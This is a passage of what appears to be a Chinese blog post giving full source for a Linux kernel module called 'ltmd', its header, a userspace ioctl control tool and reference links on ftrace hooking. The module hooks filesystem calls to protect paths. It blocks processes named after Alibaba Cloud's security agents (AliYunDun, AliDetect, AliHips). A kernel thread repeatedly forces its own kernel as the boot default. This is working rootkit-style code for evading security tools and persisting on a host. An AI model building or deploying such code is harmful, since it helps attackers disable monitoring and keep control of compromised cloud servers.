    HOOK("vfs_fstatat", fh_vfs_fstatat, &real_vfs_fstatat),
};

static int install_my_ftraces(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(my_ftrace_hooked_functions); i++)
    {
        fh_install_hook(my_ftrace_hooked_functions + i);
    }
    return 0;
}

static int uninstall_my_ftraces(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(my_ftrace_hooked_functions); i++)
    {
        fh_remove_hook(my_ftrace_hooked_functions + i);
    }
    return 0;
}

static long ltmd_ioctl(struct file *filp, unsigned int iocmd, unsigned long ioarg)
{
	int usr_to_kern_buf_max_size = 255;
	char *kern_to_usr_buf = NULL;
	char usr_to_kern_buf[255 + 1] = {0};
	long ret = 0;

	switch(iocmd)
	{
	case IOCTL_LTMD_GET_ALL_PROTECT_FILE:
#ifdef DEBUG
		printk("ltmd get all protect file\n");
#endif
		kern_to_usr_buf = get_all_protect_file();
		if( kern_to_usr_buf != NULL ){
			if( copy_to_user((void*)ioarg,kern_to_usr_buf,strlen(kern_to_usr_buf)) )
			{
				ret = -EFAULT;
			}
			kfree(kern_to_usr_buf);
		}
		break;
	case IOCTL_LTMD_ADD_PROTECT_FILE:
#ifdef DEBUG
		printk("ltmd add protect file\n");
#endif
		if( copy_from_user(usr_to_kern_buf,(void*)ioarg,usr_to_kern_buf_max_size) )
		{
			return -EFAULT;
		}
		ret = add_protect_file(usr_to_kern_buf);
		break;
	case IOCTL_LTMD_DEL_PROTECT_FILE:
#ifdef DEBUG
		printk("ltmd del protect file\n");
#endif
		if( copy_from_user(usr_to_kern_buf,(void*)ioarg,usr_to_kern_buf_max_size) )
		{
			return -EFAULT;
		}
		ret = del_protect_file(usr_to_kern_buf);
		break;
	case IOCTL_LTMD_GET_ALL_BAN_PROCESS:
#ifdef DEBUG
		printk("ltmd get all ban process name\n");
#endif
		kern_to_usr_buf = get_all_ban_process();
		if( kern_to_usr_buf != NULL ){
			if( copy_to_user((void*)ioarg,kern_to_usr_buf,strlen(kern_to_usr_buf)) )
			{
				ret = -EFAULT;
			}
			kfree(kern_to_usr_buf);
		}
		break;
	case IOCTL_LTMD_ADD_BAN_PROCESS:
#ifdef DEBUG
		printk("ltmd add ban process name\n");
#endif
		if( copy_from_user(usr_to_kern_buf,(void*)ioarg,usr_to_kern_buf_max_size) )
		{
			return -EFAULT;
		}
		ret = add_ban_process(usr_to_kern_buf);
		break;
	case IOCTL_LTMD_DEL_BAN_PROCESS:
#ifdef DEBUG
		printk("ltmd del ban process name\n");
#endif
		if( copy_from_user(usr_to_kern_buf,(void*)ioarg,usr_to_kern_buf_max_size) )
		{
			return -EFAULT;
		}
		ret = del_ban_process(usr_to_kern_buf);
		break;
	}
	return ret;
}

static const struct file_operations ltmd_fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl	= ltmd_ioctl,
	.compat_ioctl	= ltmd_ioctl,
};

static struct miscdevice ltmd_misc = {
	.fops	= &ltmd_fops,
	.name	= "ltmd",
	.minor  = MISC_DYNAMIC_MINOR, 
};

static int auto_set_start_kernel(void *data)
{
	char path[] = "/usr/sbin/grubby";
	char *argv[] = {path,"--set-default",kernel_path,NULL};
	char *envp[3];

	envp[0] = "HOME=/";
	envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
	envp[2] = NULL;
	
	while(!kthread_should_stop()){
		call_usermodehelper(path,argv,envp,UMH_WAIT_PROC);
		msleep(1000*5);//5 seconds
	}

	return 0;
}

static int __init myinit(void)
{
	printk("ltmd module init\n");	
	snprintf(kernel_path,256,"/boot/vmlinuz-%s",UTS_RELEASE);
	init_ksymbol();
	
	add_protect_file("/var/tmp/");	
	add_protect_file("/proc/");	
	add_protect_file("/boot/");	
	add_ban_process("AliYunDunMonito");	
	add_ban_process("AliYunDun");	
	add_ban_process("AliYunDunUpdate");	
	add_ban_process("AliDetect");	
	add_ban_process("AliHips");	
	add_ban_process("AliNet");	
	add_ban_process("AliSecureCheckA");	

	install_my_ftraces();
	misc_register(&ltmd_misc);

	auto_set_start_kernel_thread = kthread_run(auto_set_start_kernel,NULL,"kthread");

	return 0;
}

static void __exit myexit(void)
{
	printk("ltmd module exit\n");

	kthread_stop(auto_set_start_kernel_thread);	

	misc_deregister(&ltmd_misc);
	uninstall_my_ftraces();

	free_all_protect_file();
	free_all_ban_process();
}

module_init(myinit);
module_exit(myexit);
MODULE_LICENSE("GPL");
```

ltmd.h

```c
#ifndef __MY_LTMD_DRIVER_H__
#define __MY_LTMD_DRIVER_H__

#define IOCTL_LTMD 'w'

#define IOCTL_LTMD_GET_ALL_PROTECT_FILE					_IO(IOCTL_LTMD,1)
#define IOCTL_LTMD_ADD_PROTECT_FILE						_IO(IOCTL_LTMD,2)
#define IOCTL_LTMD_DEL_PROTECT_FILE						_IO(IOCTL_LTMD,3)

#define IOCTL_LTMD_GET_ALL_BAN_PROCESS					_IO(IOCTL_LTMD,4)
#define IOCTL_LTMD_ADD_BAN_PROCESS						_IO(IOCTL_LTMD,5)
#define IOCTL_LTMD_DEL_BAN_PROCESS						_IO(IOCTL_LTMD,6)

#endif
```

### 用户态控制代码

```c
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include "ltmd.h"

#define IOCTL_DRIVER_NAME "/dev/ltmd"

int open_driver(const char* driver_name);
void close_driver(const char* driver_name, int fd_driver);

int main(int argc,char *argv[])
{
	int fd = open_driver(IOCTL_DRIVER_NAME);
	char usr_to_kern_buf[255 + 1] = {0};
	char kern_to_usr_buf[4096 + 1] = {0};
	
	if(argc < 2 ){
		fprintf(stderr,"Usage:%s [get_all_protect_file]|[add_protect_file]|[del_protect_file]|[get_all_ban_process]|[add_ban_process]|[del_ban_process]\n",argv[0]);
		exit(EXIT_FAILURE);
	}

	if( strcmp(argv[1],"get_all_protect_file") == 0 ){
		ioctl(fd, IOCTL_LTMD_GET_ALL_PROTECT_FILE, kern_to_usr_buf);
		printf("%s",kern_to_usr_buf);
	}
	if( strcmp(argv[1],"add_protect_file") == 0 ){
		if(argc != 3){
			fprintf(stderr,"need file path");
			exit(EXIT_FAILURE);
		}
		snprintf(usr_to_kern_buf,255,"%s",argv[2]);
		ioctl(fd, IOCTL_LTMD_ADD_PROTECT_FILE, usr_to_kern_buf);
	}
	if( strcmp(argv[1],"del_protect_file") == 0 ){
		if(argc != 3){
			fprintf(stderr,"need file path");
			exit(EXIT_FAILURE);
		}
		snprintf(usr_to_kern_buf,255,"%s",argv[2]);
		ioctl(fd, IOCTL_LTMD_DEL_PROTECT_FILE, usr_to_kern_buf);
	}

	
	if( strcmp(argv[1],"get_all_ban_process") == 0 ){
		ioctl(fd, IOCTL_LTMD_GET_ALL_BAN_PROCESS, kern_to_usr_buf);
		printf("%s",kern_to_usr_buf);
	}
	if( strcmp(argv[1],"add_ban_process") == 0 ){
		if(argc != 3){
			fprintf(stderr,"need process prefix");
			exit(EXIT_FAILURE);
		}
		snprintf(usr_to_kern_buf,255,"%s",argv[2]);
		ioctl(fd, IOCTL_LTMD_ADD_BAN_PROCESS, usr_to_kern_buf);
	}
	if( strcmp(argv[1],"del_ban_process") == 0 ){
		if(argc != 3){
			fprintf(stderr,"need process prefix");
			exit(EXIT_FAILURE);
		}
		snprintf(usr_to_kern_buf,255,"%s",argv[2]);
		ioctl(fd, IOCTL_LTMD_DEL_BAN_PROCESS, usr_to_kern_buf);
	}

	close_driver(IOCTL_DRIVER_NAME,fd);
	return 0;
}

int open_driver(const char* driver_name) {

    int fd_driver = open(driver_name, O_RDWR);
    if (fd_driver == -1) {
        printf("ERROR: could not open \"%s\".\n", driver_name);
        printf("    errno = %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }

	return fd_driver;
}

void close_driver(const char* driver_name, int fd_driver) {

    int result = close(fd_driver);
    if (result == -1) {
        printf("ERROR: could not close \"%s\".\n", driver_name);
        printf("    errno = %s\n", strerror(errno));
        exit(EXIT_FAILURE);
    }
}

```

# 资料

CentOS7编译自己的内核模块

https://www.jianshu.com/p/cad48efeca67

How to compile and install Linux Kernel 5.16.9 from source code

https://www.cyberciti.biz/tips/compiling-linux-kernel-26.html

使用ftrace进行Linux内核hooking

https://blog.csdn.net/m0_46671092/article/details/108453858